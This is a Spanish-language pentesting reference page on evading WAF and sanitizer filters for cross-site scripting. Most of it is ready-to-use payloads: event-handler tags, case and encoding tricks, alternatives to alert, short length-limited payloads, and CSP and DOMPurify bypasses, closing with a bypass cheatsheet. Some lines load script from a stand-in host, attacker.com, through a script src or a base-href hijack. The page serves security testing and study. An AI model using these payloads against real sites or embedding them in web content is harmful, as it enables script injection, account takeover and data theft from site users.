---
icon: js
---

# Bypass de WAF

Las aplicaciones implementan filtros que bloquean patrones de XSS como `<script>`, `onerror=`, `javascript:`, etc. Esta sección recoge las técnicas para evadir estas protecciones.

### 1. Alternativas al tag `<script>`

Cuando `<script>` está bloqueado, casi cualquier tag HTML con un event handler funciona:

```html
<!-- Event handlers en tags de imagen/media -->
<img src=x onerror=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<source src=x onerror=alert(1)>

<!-- SVG (muy potente, acepta muchos eventos) -->
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x>
<svg><set attributeName=x onbegin=alert(1)>
<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x">

<!-- Auto-ejecutables sin clic -->
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>

<!-- Con interacción mínima -->
<div onmouseover=alert(1)>hover</div>
<a href=# onclick=alert(1)>click</a>
<form><button formaction=javascript:alert(1)>click</button></form>
<math><mtext></table><img src=x onerror=alert(1)>
<table><td background=javascript:alert(1)>   ← IE/antiguo

<!-- marquee / animaciones -->
<marquee onstart=alert(1)>
<marquee loop=1 onfinish=alert(1)>
```

### 2. Bypass de filtros de palabras clave

#### Mezclando mayúsculas y minúsculas

```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
<sCrIpT>alert(1)</ScRiPt>
<img SrC=x OnErRoR=alert(1)>
```

#### Espacios y caracteres extra entre atributos

```html
<!-- Tabs, newlines, returns entre atributos -->
<img src=x
onerror=alert(1)>

<img	src=x	onerror=alert(1)>

<!-- Caracteres raros entre tag y atributo -->
<img/src=x onerror=alert(1)>
<img %09src=x onerror=alert(1)>
<img %0asrc=x onerror=alert(1)>
```

#### Comentarios HTML dentro de tags

```html
<!-- En algunos parsers esto funciona -->
<img src=x o<!-->nerror=alert(1)>
<sc<!---->ript>alert(1)</sc<!---->ript>
```

#### Null bytes

```html
<scr%00ipt>alert(1)</scr%00ipt>
<img src=x o%00nerror=alert(1)>
```

### 3. Bypass de filtros de comillas

```html
<!-- Sin comillas en atributos -->
<img src=x onerror=alert(1)>

<!-- Comillas invertidas (backticks) como delimitador en algunos contextos -->
<img src=`x` onerror=`alert(1)`>

<!-- Comillas HTML-encoded dentro de atributos -->
<img src=x onerror=&#x61;lert(1)>
<img src=x onerror=&#97;lert(1)>

<!-- Evitar comillas en el payload JS -->
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
```

### 4. Encoding del payload

#### HTML Entities

```html
<!-- Dentro de atributos o HTML, los browsers decodifican entities antes de ejecutar -->
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>
```

#### URL Encoding (en contexto href)

```html
<a href="javascript:%61lert(1)">click</a>
<a href="java%0ascript:alert(1)">click</a>
<a href="java&#9;script:alert(1)">click</a>
<a href="javascript:alert%281%29">click</a>
```

#### Unicode escapes (en contexto JS)

```javascript
// Dentro de código JS ya ejecutado
\u0061lert(1)           // alert(1)
\u0061\u006cert(1)      // alert(1)
eval('\u0061lert\u00281\u0029')
```

#### Base64 + eval

```javascript
// Codificar payload en base64
// btoa('alert(1)') = YWxlcnQoMSk=
eval(atob('YWxlcnQoMSk='))

// Como payload en evento
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
```

### 5. Bypass del protocolo `javascript:`

```html
<!-- Variaciones de capitalización -->
javascript:alert(1)
Javascript:alert(1)
JAVASCRIPT:alert(1)
JaVaScRiPt:alert(1)

<!-- Con espacios/newlines antes del protocolo -->
 javascript:alert(1)       ← espacio
&#x09;javascript:alert(1)  ← tab
&#x0a;javascript:alert(1)  ← newline
&#x0d;javascript:alert(1)  ← carriage return

<!-- Con caracteres entre java y script -->
java%0ascript:alert(1)
java%09script:alert(1)
java&#9;script:alert(1)

<!-- Alternativas al protocolo javascript: -->
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
vbscript:alert(1)    ← solo IE antiguo
```

### 6. Bypass de `alert` bloqueado

```javascript
// Alternativas a alert()
confirm(1)
prompt(1)
console.log(1)
print()                    // Abre diálogo de impresión

// Sin paréntesis
alert`1`
confirm`1`
prompt`1`

// Con template literals
alert`${1}`

// Construir alert dinámicamente
window['alert'](1)
window['al'+'ert'](1)
this['alert'](1)
top['alert'](1)
self['alert'](1)
globalThis['alert'](1)

// Usando eval
eval('ale'+'rt(1)')
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
[].constructor.constructor('alert(1)')()
Function('alert(1)')()
```

### 7. Bypass de longitud máxima

Cuando el input tiene un límite de caracteres:

```javascript
// Payloads ultra-cortos
<q/oncut=alert(1)>          ← 21 chars, requiere ctrl+X
<svg/onload=alert(1)>       ← 21 chars
<img/src/onerror=alert(1)>  ← 26 chars

// Si solo se permiten N caracteres:
// Almacenar código en el DOM y referenciar
// Usar window.name desde otra página
// Cargar script externo:
<script src=//attacker.com/x.js>

// Desde hash:
<svg/onload=eval(location.hash.slice(1))>#alert(1)
```

### 8. Bypass de CSP (Content Security Policy)

#### Si CSP permite `unsafe-inline`

```html
<!-- Con unsafe-inline, cualquier inline script funciona -->
<script>alert(1)</script>
```

#### Si CSP permite un dominio con contenido controlable

```html
<!-- Si CSP incluye cdn.jsdelivr.net o similar -->
<script src="https://cdn.jsdelivr.net/npm/[paquete-malicioso]"></script>

<!-- Si CSP incluye el propio dominio y hay JSONP -->
<script src="https://target.com/jsonp?callback=alert(1)//"></script>
```

#### Bypass con nonce robado (si el nonce se filtra en otro sitio)

```html
<script nonce="NONCE_ROBADO">alert(1)</script>
```

#### CSP bypass con base-uri

```html
<!-- Si base-uri no está restringido -->
<base href="https://attacker.com/">
<!-- Todos los scripts relativos cargarán desde attacker.com -->
```

#### Herramienta para analizar CSP

```
https://csp-evaluator.withgoogle.com/
→ Pegar el valor del header CSP
→ Identificar debilidades bypasseables
```

### 9. Bypass de sanitizadores populares

#### DOMPurify (bypasses históricos, ya parcheados)

```html
<!-- Técnicas que han funcionado en versiones antiguas -->
<!-- Siempre verificar versión instalada -->
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
<svg><foreignObject><math><mi><img src=x onerror=alert(1)>
```

#### Filtros con regex simples

```javascript
// Si el filtro hace: input.replace(/<script>/gi, '')
// Anidar el tag para que al eliminarlo quede uno válido:
<scr<script>ipt>alert(1)</scr<script>ipt>
→ Después del replace: <script>alert(1)</script>

// Si el filtro elimina "on" de eventos:
// onerror → r → onr → ...
// Usar: <img src=x onerror=alert(1)>  si el filtro solo bloquea "onerror" exacto:
<img src=x OnErRoR=alert(1)>
```

### Cheatsheet de bypass

| Bloqueado            | Bypass                                        |
| -------------------- | --------------------------------------------- |
| `<script>`           | `<img src=x onerror=...>`, `<svg onload=...>` |
| `onerror` / `onload` | Mezcla de mayúsculas: `OnErRoR`, `OnLoAd`     |
| `alert`              | `confirm`, `prompt`, `eval(atob(...))`        |
| `javascript:`        | `&#106;avascript:`, `java%0ascript:`          |
| Comillas `"` / `'`   | Backtick `` ` ``, HTML entities, sin comillas |
| `=` en atributos     | Sin comillas: `onerror=alert(1)`              |
| Espacios             | `%09`, `%0a`, `/` entre tag y atributo        |
| Longitud corta       | `<svg/onload=alert(1)>` (21 chars)            |

> **DOM Invader** (Burp Suite) inyecta canarios en todos los inputs y monitorea cuáles llegan a sinks peligrosos, ideal para detectar DOM XSS con filtros.

> Para identificar qué está bloqueando el WAF, probar de forma incremental: primero `<`, luego `<img`, luego `<img src`, etc., hasta encontrar qué token dispara el bloqueo.

> `https://csp-evaluator.withgoogle.com/` es la herramienta más rápida para identificar debilidades en una CSP antes de intentar bypasses manuales.
